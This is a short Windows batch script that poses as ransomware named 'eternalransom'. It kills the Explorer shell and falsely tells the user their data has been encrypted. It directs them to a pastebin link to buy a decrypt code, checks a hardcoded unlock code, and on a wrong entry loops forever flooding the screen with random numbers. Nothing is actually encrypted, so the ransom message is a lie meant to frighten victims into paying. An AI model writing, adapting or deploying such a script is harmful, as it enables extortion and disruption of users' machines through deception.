@echo off
taskkill /f /im explorer.exe
color 4
cls
echo Your data have been encrypted by eternalransom
echo To decrypt it you need to buy a decrypt code on https://pastebin.com/f0HpNjYd
set code=""

:code
set /p code="Enter Code:"
if "%code%"=="X9fn?x!ldnLkD93" goto correct
if NOT "%code%"=="X9fn?x!ldnLkD93" goto wrong

:correct
start userinit
echo Correct Code
pause
exit

:wrong
echo Wrong Code, Try again
color 04
:start
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
goto start